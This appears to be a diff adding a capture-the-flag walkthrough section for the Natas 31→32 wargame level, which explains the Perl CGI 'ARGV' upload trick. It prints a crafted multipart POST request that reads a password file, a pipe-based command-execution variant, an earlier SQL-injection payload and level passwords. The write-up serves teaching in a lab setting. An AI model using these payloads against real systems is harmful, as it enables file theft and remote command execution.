@@ -853,3 +853,66 @@ username=name&password='pass'%20or%201%3d1&password=2
 We make the server use `name` as the username and `pass or 1=1` as the password, while treating it as a non-string type (as shown [here](https://www.nntp.perl.org/group/perl.dbi.dev/2001/11/msg485.html?ref=learnhacking.io), we could also use other data types). So no quotes are added, our `SQL injection` works and we get the next password.
 
 Password: `m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y`
+
+## Level 31 → 32
+Once we log in, we have the source code and an option to upload a file. It's supposed to be a `CSV` file, but any file will work, and once uploaded, it is being printed nicely on the screen. I thought there's an easy vulnerability right here, but I tried uploading many files with different types and tricks but nothing worked. 
+
+As seen in [this video](https://www.youtube.com/watch?v=RPvORV2Amic) ([PDF](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf)) about a known exploitation in Perl, `The Perl Jam 2`, the key in this level is the `Perl` language itself, not how it has been used. Starting at about 13:45 minutes, Netanel explains how different modules handle input data, in our case the used module is `CGI`, as we can see in the source code. Then, at about 18:35 minutes, we can see an "extreme example", which is very familiar to the code in this level. In fact, it is the same up until the `while` loop.
+
+```
+my $cgi = CGI->new;
+if ($cgi->upload('file')) {
+    my $file = $cgi->param('file');
+    print '<table class="sortable table table-hover table-striped">';
+    $i=0;
+    while (<$file>) {
+...
+```
+Let's explain step by step. The first row creates a new `CGI` instance, which is a protocol that lets us execute perl commands from web requests.
+```
+if ($cgi->upload('file')) {
+```
+`upload()` is supposed to check if the `file` parameter is an uploaded file. In reality, `upload()` checks if ONE of `file` values is an uploaded file. Therefore, uploading a file AND assigning a scalar to the same parameter will work.
+```
+my $file = $cgi->param('file');
+```
+`param()` returns a list of all the parameter values, but only the first value is inserted into `$file`. If the scalar value was assigned first, `$file` will be assigned the scalar value instead of the uploaded `file descriptor`, which means `$file` is now a regular string.
+```
+while (<$file>) {
+```
+`<>` doesn’t work with strings, unless the string is `"ARGV"`. In that case, `<>` loops through the ARG values, inserting each one to an `open()` call. Instead of displaying our uploaded file content, `<>` will now display the content of ANY file we’d like, and that file is the password file.
+
+So, using `Burp` we capture the `POST` request of submitting a random `CSV` file. Then, by using what we learned from the source above, we craft this request:
+```
+POST /index.pl?%2fetc%2fnatas_webpass%2fnatas32 HTTP/1.1
+...
+
+------geckoformboundary1a049a7a33f067ae1047023a86016037
+Content-Disposition: form-data; name="file"
+
+ARGV
+------geckoformboundary1a049a7a33f067ae1047023a86016037
+Content-Disposition: form-data; name="file"; filename="username.csv"
+Content-Type: text/csv
+
+Username; Identifier;First name;Last name
+booker12;9012;Rachel;Jones;</script>
+
+------geckoformboundary1a049a7a33f067ae1047023a86016037
+Content-Disposition: form-data; name="submit"
+
+Upload
+------geckoformboundary1a049a7a33f067ae1047023a86016037--
+```
+We made 2 changes to the original request. First, we added `?/etc/natas_webpass/natas32` to the URL. This is the string `file descriptor` we talked about, being inserted into `open()`. Second, we added this part:
+```
+------geckoformboundary1a049a7a33f067ae1047023a86016037
+Content-Disposition: form-data; name="file"
+
+ARGV
+```
+This is the first file uploaded, and as discussed earlier, it only contains `"ARGV"`. We send this request, and just like that we've managed to trick Perl into showing us the password using `The Perl Jam 2` vulnerability.
+
+It's worth mentioning that according to the source, adding `|` at the end of the URL will make Perl execute a command instead of just reading that as a file descriptor. Therefore, another way is adding `?cat%20/etc/natas_webpass/natas32%20|` to the URL, while making the same `ARGV` change as before.
+
+Password: `NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`
